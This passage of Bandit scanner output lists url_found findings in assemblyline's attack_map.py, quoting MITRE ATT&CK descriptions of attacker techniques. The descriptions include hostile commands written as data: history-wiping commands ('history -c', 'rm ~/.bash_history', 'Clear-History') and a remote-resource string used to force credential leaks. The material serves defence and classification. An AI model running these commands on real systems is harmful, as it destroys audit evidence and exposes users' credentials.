2801	                          '2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver '
2802	                          'with files delivered during Initial Access or download it to a compromised system via '

>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_benign/assemblyline-4.6.0.dev5/assemblyline-4.6.0.dev5/assemblyline/common/attack_map.py:2944
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
2943	               'categories': ['defense-evasion'],
2944	               'description': 'In addition to clearing system logs, an adversary may clear the command history of a '
2945	                              'compromised account to conceal the actions undertaken during an intrusion. Various '
2946	                              'command interpreters keep track of the commands users type in their terminal so that '
2947	                              "users can retrace what they've done.\n"
2948	                              '\n'
2949	                              'On Linux and macOS, these command histories can be accessed in a few different ways. '
2950	                              'While logged in, this command history is tracked in a file pointed to by the '
2951	                              'environment variable <code>HISTFILE</code>. When a user logs off a system, this '
2952	                              "information is flushed to a file in the user's home directory called "
2953	                              '<code>~/.bash_history</code>. The benefit of this is that it allows users to go back to '
2954	                              "commands they've used before in different sessions.\n"
2955	                              '\n'
2956	                              'Adversaries may delete their commands from these logs by manually clearing the history '
2957	                              '(<code>history -c</code>) or deleting the bash history file <code>rm '
2958	                              '~/.bash_history</code>.  \n'
2959	                              '\n'
2960	                              'Adversaries may also leverage a [Network Device '
2961	                              'CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command '
2962	                              'history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: '
2963	                              'US-CERT-TA18-106A)\n'
2964	                              '\n'
2965	                              'On Windows hosts, PowerShell has two different command history providers: the built-in '
2966	                              'history and the command history managed by the <code>PSReadLine</code> module. The '
2967	                              'built-in history only tracks the commands used in the current session. This command '
2968	                              'history is not available to other sessions and is deleted when the session ends.\n'
2969	                              '\n'
2970	                              'The <code>PSReadLine</code> command history tracks the commands used in all PowerShell '
2971	                              'sessions and writes them to a file '
2972	                              '(<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> '
2973	                              'by default). This history file is available to all sessions and contains all past '
2974	                              'history since the file is not deleted when the session ends.(Citation: Microsoft '
2975	                              'PowerShell Command History)\n'
2976	                              '\n'
2977	                              'Adversaries may run the PowerShell command <code>Clear-History</code> to flush the '
2978	                              'entire command history from a current PowerShell session. This, however, will not '
2979	                              'delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete '
2980	                              'the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell '
2981	                              'commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos '
2982	                              'PowerShell Command History Forensics)',
2983	               'name': 'Clear Command History',
2984	               'platforms': ['Linux', 'macOS', 'Windows', 'Network']},

3400	                          "malicious portion can be executed to run the adversary's code on a remote system. "

3403	                          'A directory share pivot is a variation on this technique that uses several other techniques '
3404	                          'to propagate malware when users access a shared network directory. It uses [Shortcut '
3405	                          'Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that '
3406	                          'use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real '
3407	                          'directories, which are hidden through [Hidden Files and '
3408	                          'Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based '
3409	                          'directories have an embedded command that executes the hidden malware file in the directory '
3410	                          "and then opens the real intended directory so that the user's expected action still occurs. "
3411	                          'When used with frequently used network directories, the technique may result in frequent '
3412	                          'reinfections and broad access to systems and potentially to new and higher privileged '
3413	                          'accounts. (Citation: Retwin Directory Share Pivot)\n'
3414	                          '\n'

3416	                          'appending or prepending its code to the healthy binary on the shared network directory. The '
3417	                          'malware may modify the original entry point (OEP) of the healthy binary to ensure that it '
3418	                          'is executed before the legitimate code. The infection could continue to spread via the '
3419	                          'newly infected file when it is executed by a remote system. These infections may target '

3429	                          'Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape '
3430	                          'follow-on behaviors, including whether or not the adversary fully infects the target and/or '
3431	                          'attempts specific actions.\n'
3432	                          '\n'

3434	                          'detailed system information. If running with privileged access, a breakdown of system data '
3435	                          'can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an '
3436	                          'example, adversaries with user-level access can execute the <code>df -aH</code> command to '
3437	                          'obtain currently mounted disks and associated freely available space. Adversaries may also '
3438	                          'leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network '

3441	                          'Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered '

>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_benign/assemblyline-4.6.0.dev5/assemblyline-4.6.0.dev5/assemblyline/common/attack_map.py:3617
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
3616	               'categories': ['command-and-control'],
3617	               'description': 'Adversaries may chain together multiple proxies to disguise the source of malicious '
3618	                              'traffic. Typically, a defender will be able to identify the last proxy traffic '
3619	                              'traversed before it enters their network; the defender may or may not be able to '
3620	                              'identify any previous proxies before the last-hop proxy. This technique makes '
3621	                              'identifying the original source of the malicious traffic even more difficult by '
3622	                              'requiring the defender to trace malicious traffic through several proxies to identify '
3623	                              'its source.\n'
3624	                              '\n'
3625	                              'For example, adversaries may construct or use onion routing networks – such as the '
3626	                              'publicly available [Tor](https://attack.mitre.org/software/S0183) network – to '
3627	                              'transport encrypted C2 traffic through a compromised population, allowing communication '
3628	                              'with any device within the network.(Citation: Onion Routing)\n'
3629	                              '\n'
3630	                              'In the case of network infrastructure, it is possible for an adversary to leverage '
3631	                              'multiple compromised devices to create a multi-hop proxy chain (i.e., [Network '
3632	                              'Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System '
3633	                              'Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add '
3634	                              'custom code to the affected network devices that will implement onion routing between '
3635	                              'those nodes. This method is dependent upon the [Network Boundary '
3636	                              'Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to '
3637	                              'cross the protected network boundary of the Internet perimeter and into the '
3638	                              'organization’s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a '
3639	                              'transport.\n'
3640	                              '\n'
3641	                              'Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented '
3642	                              'infrastructure to implement routing between a decentralized network of peers.(Citation: '
3643	                              'NGLite Trojan)',

3802	                              'compromise. This may further enable use of additional techniques for gaining access to '
3803	                              'systems. For example, compromised business accounts are often used to send messages to '
3804	                              'other accounts in the network of the target business while creating inbox rules (ex: '
3805	                              '[Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages '
3806	                              'evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - '
3807	                              '2019)',

>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_benign/assemblyline-4.6.0.dev5/assemblyline-4.6.0.dev5/assemblyline/common/attack_map.py:3844
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
3843	               'categories': ['persistence', 'privilege-escalation'],
3844	               'description': 'Adversaries may modify the SSH <code>authorized_keys</code> file to maintain '
3845	                              'persistence on a victim host. Linux distributions and macOS commonly use key-based '
3846	                              'authentication to secure the authentication process of SSH sessions for remote '
3847	                              'management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that '
3848	                              'can be used for logging into the user account for which the file is configured. This '
3849	                              "file is usually found in the user's home directory under "
3850	                              '<code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) '
3851	                              'Users may edit the system’s SSH config file to modify the directives '
3852	                              'PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and '
3853	                              'RSA authentication are enabled. The SSH config file is usually located under '
3854	                              '<code>/etc/ssh/sshd_config</code>.\n'
3855	                              '\n'
3856	                              'Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or '
3857	                              'shell commands to add their own adversary-supplied public keys. In cloud environments, '
3858	                              'adversaries may be able to modify the SSH authorized_keys file of a particular virtual '
3859	                              'machine via the command line interface or rest API. For example, by using the Google '
3860	                              'Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user '
3861	                              'account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege '
3862	                              'Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a '
3863	                              'virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual '
3864	                              'Machines) This ensures that an adversary possessing the corresponding private key may '
3865	                              'log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: '
3866	                              'Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual '
3867	                              'machine or instance has distinct permissions from the requesting user.\n'
3868	                              '\n'
3869	                              'Where authorized_keys files are modified via cloud APIs or command line interfaces, an '
3870	                              'adversary may achieve privilege escalation on the target virtual machine if they add a '
3871	                              'key to a higher-privileged user. \n'
3872	                              '\n'
3873	                              'SSH keys can also be added to accounts on network devices, such as with the `ip ssh '
3874	                              'pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) '
3875	                              'command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)',

4063	           'categories': ['execution'],
4064	           'description': 'Adversaries may interact with the native OS application programming interface (API) to '
4065	                          'execute behaviors. Native APIs provide a controlled means of calling low-level OS services '
4066	                          'within the kernel, such as those involving hardware/devices, memory, and '
4067	                          'processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are '
4068	                          'leveraged by the OS during system boot (when other system components are not yet '
4069	                          'initialized) as well as carrying out tasks and requests during routine operations.\n'
4070	                          '\n'
4071	                          'Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to '
4072	                          '[Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native '
4073	                          'API and its hierarchy of interfaces provide mechanisms to interact with and utilize various '
4074	                          'components of a victimized system.\n'
4075	                          '\n'
4076	                          'Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via '
4077	                          'system calls / syscalls, but these features are also often exposed to user-mode '
4078	                          'applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: '
4079	                          'CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the '
4080	                          'Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and '
4081	                          'scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) '
4082	                          'This may allow API callers to execute a binary, run a CLI command, load modules, etc. as '
4083	                          'thousands of similar API functions exist for various system operations.(Citation: Microsoft '
4084	                          'Win32)(Citation: LIBC)(Citation: GLIBC)\n'
4085	                          '\n'
4086	                          'Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also '
4087	                          'available to interact with native APIs. These frameworks typically provide language '
4088	                          'wrappers/abstractions to API functionalities and are designed for ease-of-use/portability '
4089	                          'of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS '
4090	                          'Cocoa)(Citation: macOS Foundation)\n'
4091	                          '\n'

4093	                          'subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: '
4094	                          'Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools '
4095	                          'associated with API monitoring, such as unhooking monitored functions via [Disable or '
4096	                          'Modify Tools](https://attack.mitre.org/techniques/T1562/001).',

4669	           'categories': ['defense-evasion', 'privilege-escalation'],
4670	           'description': 'Adversaries may modify access tokens to operate under a different user or system security '
4671	                          'context to perform actions and bypass access controls. Windows uses access tokens to '
4672	                          'determine the ownership of a running process. A user can manipulate access tokens to make a '
4673	                          'running process appear as though it is the child of a different process or belongs to '
4674	                          'someone other than the user that started the process. When this occurs, the process also '
4675	                          'takes on the security context associated with the new token.\n'
4676	                          '\n'
4677	                          'An adversary can use built-in Windows API functions to copy access tokens from existing '
4678	                          'processes; this is known as token stealing. These token can then be applied to an existing '
4679	                          'process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) '
4680	                          'or used to spawn a new process (i.e. [Create Process with '
4681	                          'Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a '
4682	                          'privileged user context (i.e. administrator) to steal a token. However, adversaries '
4683	                          'commonly use token stealing to elevate their security context from the administrator level '
4684	                          'to the SYSTEM level. An adversary can then use a token to authenticate to a remote system '
4685	                          'as the account for that token if the account has appropriate permissions on the remote '
4686	                          'system.(Citation: Pentestlab Token Manipulation)\n'
4687	                          '\n'
4688	                          'Any standard user can use the <code>runas</code> command, and the Windows API functions, to '
4689	                          'create impersonation tokens; it does not require access to an administrator account. There '
4690	                          'are also other mechanisms, such as Active Directory fields, that can be used to modify '
4691	                          'access tokens.',

4700	                              "calling thread to impersonate a logged on user's security context, or with "
4701	                              '`SetThreadToken` to assign the impersonated token to a thread.\n'

4723	                              '<code>runas</code>.(Citation: Microsoft RunAs)\n'

4753	               'categories': ['defense-evasion', 'privilege-escalation'],
4754	               'description': 'Adversaries may spoof the parent process identifier (PPID) of a new process to evade '
4755	                              'process-monitoring defenses or to elevate privileges. New processes are typically '
4756	                              'spawned directly from their parent, or calling, process unless explicitly specified. '
4757	                              'One way of explicitly assigning the PPID of a new process is via the '
4758	                              '<code>CreateProcess</code> API call, which supports a parameter that defines the PPID '
4759	                              'to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by '
4760	                              'Windows features such as User Account Control (UAC) to correctly set the PPID after a '
4761	                              'requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> '
4762	                              'or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft '
4763	                              'UAC Nov 2018)\n'
4764	                              '\n'
4765	                              'Adversaries may abuse these mechanisms to evade defenses, such as those blocking '
4766	                              'processes spawning directly from Office documents, and analysis targeting '
4767	                              'unusual/potentially malicious parent-child process relationships, such as spoofing the '
4768	                              'PPID of '
4769	                              '[PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) '
4770	                              'to be <code>explorer.exe</code> rather than an Office document delivered as part of '
4771	                              '[Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: '
4772	                              'CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual '
4773	                              'Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office '
4774	                              'document or any code that can perform [Native '
4775	                              'API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar '
4776	                              '2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n'
4777	                              '\n'
4778	                              'Explicitly assigning the PPID may also enable elevated privileges given appropriate '
4779	                              'access rights to the parent process. For example, an adversary in a privileged user '
4780	                              'context (i.e. administrator) may spawn a new process and assign the parent as a process '
4781	                              'running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be '
4782	                              'elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)',

5083	                          'Model](https://attack.mitre.org/techniques/T1021/003) and [Component Object '

5085	                          '\n'
5086	                          'Adversaries may use the Windows Component Object Model (COM) and Distributed Component '
5087	                          'Object Model (DCOM) for local code execution or to execute on remote systems as part of '
5088	                          'lateral movement. \n'
5089	                          '\n'
5090	                          'COM is a component of the native Windows application programming interface (API) that '
5091	                          'enables interaction between software objects, or executable code that implements one or '
5092	                          'more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can '
5093	                          'call methods of server objects, which are typically Dynamic Link Libraries (DLL) or '
5094	                          'executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the '
5095	                          'functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local '
5096	                          'computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June '
5097	                          '2019)\n'
5098	                          '\n'
5099	                          'Permissions to interact with local and remote server COM objects are specified by access '
5100	                          'control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft '
5101	                          'Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only '
5102	                          'Administrators may remotely activate and launch COM objects through DCOM.\n'
5103	                          '\n'
5104	                          'Adversaries may abuse COM for local command and/or payload execution. Various COM '
5105	                          'interfaces are exposed that can be abused to invoke arbitrary execution via a variety of '
5106	                          'programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific '
5107	                          'COM objects also exists to directly perform functions beyond code execution, such as '
5108	                          'creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless '
5109	                          'download/execution, and other adversary behaviors such as Privilege Escalation and '

>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_benign/assemblyline-4.6.0.dev5/assemblyline-4.6.0.dev5/assemblyline/common/attack_map.py:5165
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
5164	           'categories': ['collection'],
5165	           'description': 'Adversaries may take advantage of security vulnerabilities and inherent functionality in '
5166	                          'browser software to change content, modify user-behaviors, and intercept information as '
5167	                          'part of various browser session hijacking techniques.(Citation: Wikipedia Man in the '
5168	                          'Browser)\n'
5169	                          '\n'
5170	                          'A specific example is when an adversary injects software into a browser that allows them to '
5171	                          'inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser '
5172	                          'as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser '
5173	                          'Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as '
5174	                          'pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> '
5175	                          'and/or high-integrity/administrator rights.\n'
5176	                          '\n'
5177	                          "Another example involves pivoting browser traffic from the adversary's browser through the "
5178	                          "user's browser by setting up a proxy which will redirect web traffic. This does not alter "
5179	                          "the user's traffic in any way, and the proxy connection can be severed as soon as the "
5180	                          'browser is closed. The adversary assumes the security context of whichever browser process '
5181	                          'the proxy is injected into. Browsers typically create a new process for each tab that is '
5182	                          'opened and permissions and certificates are separated accordingly. With these permissions, '
5183	                          'an adversary could potentially browse to any resource on an intranet, such as '
5184	                          '[Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible '
5185	                          'through the browser and which the browser has sufficient permissions. Browser pivoting may '
5186	                          'also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)',
5187	           'name': 'Browser Session Hijacking',
5188	           'platforms': ['Windows']},

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_benign/assemblyline-4.6.0.dev5/assemblyline-4.6.0.dev5/assemblyline/common/attack_map.py:5191
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
5190	           'categories': ['credential-access'],
5191	           'description': 'Adversaries may gather credential material by invoking or forcing a user to automatically '
5192	                          'provide authentication information through a mechanism in which they can intercept.\n'
5193	                          '\n'
5194	                          'The Server Message Block (SMB) protocol is commonly used in Windows networks for '
5195	                          'authentication and communication between systems for access to resources and file sharing. '
5196	                          'When a Windows system attempts to connect to an SMB resource it will automatically attempt '
5197	                          'to authenticate and send credential information for the current user to the remote system. '
5198	                          '(Citation: Wikipedia Server Message Block) This behavior is typical in enterprise '
5199	                          'environments so that users do not need to enter credentials to access network resources.\n'
5200	                          '\n'
5201	                          'Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems '
5202	                          'as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will '
5203	                          'typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) '
5204	                          '(Citation: Microsoft Managing WebDAV Security)\n'
5205	                          '\n'
5206	                          'Adversaries may take advantage of this behavior to gain access to user account hashes '
5207	                          'through forced SMB/WebDAV authentication. An adversary can send an attachment to a user '
5208	                          'through spearphishing that contains a resource link to an external server controlled by the '
5209	                          'adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place '
5210	                          'a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed '
5211	                          "on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's "
5212	                          'system accesses the untrusted resource it will attempt authentication and send information, '
5213	                          "including the user's hashed credentials, over SMB to the adversary controlled server. "
5214	                          '(Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform '
5215	                          'off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access '
5216	                          'to plaintext credentials. (Citation: Cylance Redirect to SMB)\n'
5217	                          '\n'
5218	                          'There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) '
5219	                          'Some specifics from in-the-wild use include:\n'
5220	                          '\n'
5221	                          '* A spearphishing attachment containing a document with a resource that is automatically '
5222	                          'loaded when the document is opened (i.e. [Template '
5223	                          'Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for '
5224	                          'example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger '
5225	                          'the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n'
5226	                          '* A modified .LNK or .SCF file with the icon filename pointing to an external reference '
5227	                          'such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the '
5228	                          'resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT '
5229	                          'Energy Oct 2017)',
5230	           'name': 'Forced Authentication',
5231	           'platforms': ['Windows']},

>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_benign/assemblyline-4.6.0.dev5/assemblyline-4.6.0.dev5/assemblyline/common/attack_map.py:5234
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
5233	           'categories': ['initial-access'],
5234	           'description': 'Adversaries may gain access to a system through a user visiting a website over the normal '
5235	                          "course of browsing. With this technique, the user's web browser is typically targeted for "
5236	                          'exploitation, but adversaries may also use compromised websites for non-exploitation '
5237	                          'behavior such as acquiring [Application Access '
5238	                          'Token](https://attack.mitre.org/techniques/T1550/001).\n'
5239	                          '\n'
5240	                          'Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by '
5241	                          'Target](https://attack.mitre.org/techniques/T1608/004)), including:\n'
5242	                          '\n'
5243	                          '* A legitimate website is compromised where adversaries have injected some form of '
5244	                          'malicious code such as JavaScript, iFrames, and cross-site scripting\n'
5245	                          '* Script files served to a legitimate website from a publicly writeable cloud storage '
5246	                          'bucket are modified by an adversary\n'
5247	                          '* Malicious ads are paid for and served through legitimate ad providers (i.e., '
5248	                          '[Malvertising](https://attack.mitre.org/techniques/T1583/008))\n'
5249	                          '* Built-in web application interfaces are leveraged for the insertion of any other kind of '
5250	                          'object that can be used to display web content or contain a script that executes on the '
5251	                          'visiting client (e.g. forum posts, comments, and other user controllable web content).\n'
5252	                          '\n'
5253	                          'Often the website used by an adversary is one visited by a specific community, such as '
5254	                          'government, a particular industry, or region, where the goal is to compromise a specific '
5255	                          'user or set of users based on a shared interest. This kind of targeted campaign is often '
5256	                          'referred to a strategic web compromise or watering hole attack. There are several known '
5257	                          'examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)\n'
5258	                          '\n'
5259	                          'Typical drive-by compromise process:\n'
5260	                          '\n'
5261	                          '1. A user visits a website that is used to host the adversary controlled content.\n'
5262	                          '2. Scripts automatically execute, typically searching versions of the browser and plugins '
5263	                          'for a potentially vulnerable version. \n'
5264	                          '    * The user may be required to assist in this process by enabling scripting or active '
5265	                          'website components and ignoring warning dialog boxes.\n'
5266	                          '3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n'
5267	                          '4. If exploitation is successful, then it will give the adversary code execution on the '
5268	                          "user's system unless other protections are in place.\n"
5269	                          '    * In some cases a second visit to the website after the initial scan is required before '
5270	                          'exploit code is delivered.\n'
5271	                          '\n'
5272	                          'Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the '
5273	                          'focus of this technique is to exploit software on a client endpoint upon visiting a '
5274	                          'website. This will commonly give an adversary access to systems on the internal network '
5275	                          'instead of external systems that may be in a DMZ.\n'
5276	                          '\n'
5277	                          'Adversaries may also use compromised websites to deliver a user to a malicious application '
5278	                          'designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, '
5279	                          'like OAuth tokens, to gain access to protected applications and information. These '
5280	                          'malicious applications have been delivered through popups on legitimate websites.(Citation: '
5281	                          'Volexity OceanLotus Nov 2017)',
5282	           'name': 'Drive-by Compromise',
5283	           'platforms': ['Windows', 'Linux', 'macOS', 'SaaS']},

5378	           'categories': ['defense-evasion', 'persistence'],
5379	           'description': 'Adversaries may abuse BITS jobs to persistently execute code and perform various background '
5380	                          'tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, '
5381	                          'asynchronous file transfer mechanism exposed through [Component Object '
5382	                          'Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft '
5383	                          'COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other '
5384	                          'applications preferred to operate in the background (using available idle bandwidth) '
5385	                          'without interrupting other networked applications. File transfer tasks are implemented as '
5386	                          'BITS jobs, which contain a queue of one or more file operations.\n'
5387	                          '\n'
5388	                          'The interface to create and manage BITS jobs is accessible through '
5389	                          '[PowerShell](https://attack.mitre.org/techniques/T1059/001) and the '
5390	                          '[BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft '
5391	                          'BITS)(Citation: Microsoft BITSAdmin)\n'
5392	                          '\n'
5393	                          'Adversaries may abuse BITS to download (e.g. [Ingress Tool '
5394	                          'Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after '
5395	                          'running malicious code (e.g. [Indicator '
5396	                          'Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the '
5397	                          'BITS job database, without new files or registry modifications, and often permitted by host '
5398	                          'firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS '
5399	                          'May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable '
5400	                          'persistence by creating long-standing jobs (the default maximum lifetime is 90 days and '
5401	                          'extendable) or invoking an arbitrary program when a job completes or errors (including '
5402	                          'after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware '
5403	                          'June 2016)\n'
5404	                          '\n'
5405	                          'BITS upload functionalities can also be used to perform [Exfiltration Over Alternative '
5406	                          'Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)',
5407	           'name': 'BITS Jobs',
5408	           'platforms': ['Windows']},

5463	                          'various command shell utilities such as <code>net accounts (/domain)</code>, '

5497	                          'Vulnerabilities can exist in software due to unsecure coding practices that can lead to '
5498	                          'unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through '
5499	                          'targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most '
5500	                          'valuable exploits to an offensive toolkit are those that can be used to obtain code '
5501	                          'execution on a remote system because they can be used to gain access to that system. Users '
5502	                          'will expect to see files related to the applications they commonly used to do work, so they '
5503	                          'are a useful target for exploit research and development because of their high utility.\n'
5504	                          '\n'
5505	                          'Several types exist:\n'
5506	                          '\n'
5507	                          '### Browser-based Exploitation\n'
5508	                          '\n'
5509	                          'Web browsers are a common target through [Drive-by '
5510	                          'Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing '
5511	                          'Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised '
5512	                          'through normal web browsing or from certain users being targeted by links in spearphishing '
5513	                          'emails to adversary controlled sites used to exploit the web browser. These often do not '
5514	                          'require an action by the user for the exploit to be executed.\n'
5515	                          '\n'
5516	                          '### Office Applications\n'
5517	                          '\n'
5518	                          'Common office and productivity applications such as Microsoft Office are also targeted '
5519	                          'through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be '
5520	                          'transmitted directly as attachments or through links to download them. These require the '
5521	                          'user to open the document or file for the exploit to run.\n'
5522	                          '\n'
5523	                          '### Common Third-party Applications\n'
5524	                          '\n'
5525	                          'Other applications that are commonly seen or are part of the software deployed in a target '
5526	                          'network may also be used for exploitation. Applications such as Adobe Reader and Flash, '
5527	                          'which are common in enterprise environments, have been routinely targeted by adversaries '
5528	                          'attempting to gain access to systems. Depending on the software and nature of the '
5529	                          'vulnerability, some may be exploited in the browser or require the user to open a file. For '
5530	                          'instance, some Flash exploits have been delivered as objects within Microsoft Office '
5531	                          'documents.',

>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_benign/assemblyline-4.6.0.dev5/assemblyline-4.6.0.dev5/assemblyline/common/attack_map.py:5619
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
5618	           'categories': ['defense-evasion', 'persistence', 'command-and-control'],
5619	           'description': 'Adversaries may use traffic signaling to hide open ports or other malicious functionality '
5620	                          'used for persistence or command and control. Traffic signaling involves the use of a magic '
5621	                          'value or sequence that must be sent to a system to trigger a special response, such as '
5622	                          'opening a closed port or executing a malicious task. This may take the form of sending a '
5623	                          'series of packets with certain characteristics before a port will be opened that the '
5624	                          'adversary can use for command and control. Usually this series of packets consists of '
5625	                          'attempted connections to a predefined sequence of closed ports (i.e. [Port '
5626	                          'Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, '
5627	                          'specific strings, or other unique characteristics. After the sequence is completed, opening '
5628	                          'a port may be accomplished by the host-based firewall, but could also be implemented by '
5629	                          'custom software.\n'
5630	                          '\n'
5631	                          'Adversaries may also communicate with an already open port, but the service listening on '
5632	                          'that port will only respond to commands or trigger other malicious functionality if passed '
5633	                          'the appropriate magic value(s).\n'
5634	                          '\n'
5635	                          'The observation of the signal packets to trigger the communication can be conducted through '
5636	                          'different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r '
